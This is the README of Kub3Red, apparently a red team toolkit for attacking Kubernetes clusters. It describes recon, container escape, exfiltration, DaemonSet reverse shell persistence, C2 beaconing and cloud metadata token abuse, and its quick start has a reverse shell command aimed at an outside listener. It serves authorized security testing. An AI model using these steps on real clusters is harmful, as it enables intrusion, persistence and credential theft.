
# Kub3Red


**Kub3Red** – Kubernetes Red Team & Exploitation Toolkit (multi-cloud)

Kub3Red is a powerful, modular red team framework designed to assess, exploit, and persist in Kubernetes environments across cloud providers (AKS, EKS, GKE, OpenShift, self-hosted).

---

## ✨ Features

- 🔍 **Recon & Enumeration**
  - Namespaces, Pods, Services, Secrets, RBAC, ConfigMaps, NetworkPolicies, etc.
  - `kubectl auth can-i` checks
  - Pod/Node IP and port scanning
  - Container and Node-level service detection

- 🔥 **Attack Phases**
  - `phase` based kill-chain: prep, recon, kubelet, misconfig, secrets, escape, exfil
  - Full chain via `--all`, `--all-extended`, or `--fast`

- 🎯 **Persistence**
  - Reverse shell via DaemonSet to all nodes
  - CronJob C2 beaconing
  - Full cleanup of artifacts

- ⚙️ **Extended Modules**
  - Admission controller abuse
  - Aggregated APIs, quotas, event logs, Prometheus detection
  - Runtime abuse detection
  - Cloud IMDS token abuse and potential cloud privilege escalation

- 💾 **CSV Exporting**
  - All recon results can be exported for professional reporting

---

## 🚀 Quick Start

```bash
# Basic recon
python __main__.py --nodes --pods --services --csv

# Run entire attack chain
python __main__.py --all

# Run full extended attack + recon chain
python __main__.py --all-extended --csv

# Reverse shell test
python __main__.py --phase persist --lhost 10.10.10.10 --lport 443
```

---

## ⚠️ Disclaimer

Kub3Red is provided for **educational and authorized security assessment purposes only**.  
**Do not use this tool on environments you do not have permission to assess.**

---

## 📦 Requirements

- Python 3.8+
- Packages:
  - `kubernetes`
  - `requests`
  - `pyfiglet`
  - `rich`
  - `termcolor`
  - `tabulate`

Install all requirements:

```bash
pip install -r requirements.txt
```

---

## 📂 Project Structure

```
Kub3Red/
├── __main__.py          # Entry point & CLI parser
├── api_enum.py          # All API recon functions
├── phases.py            # Attack chain modules
├── utils.py             # Shared logging, YAML, exec
├── requirements.txt     # Python dependencies
└── README.md            # This file
```

---

## 📖 Documentation

More usage details and module descriptions coming soon.

For now, run `python __main__.py -h` to see detailed CLI help.

---

Made with ❤️ by red team operators.

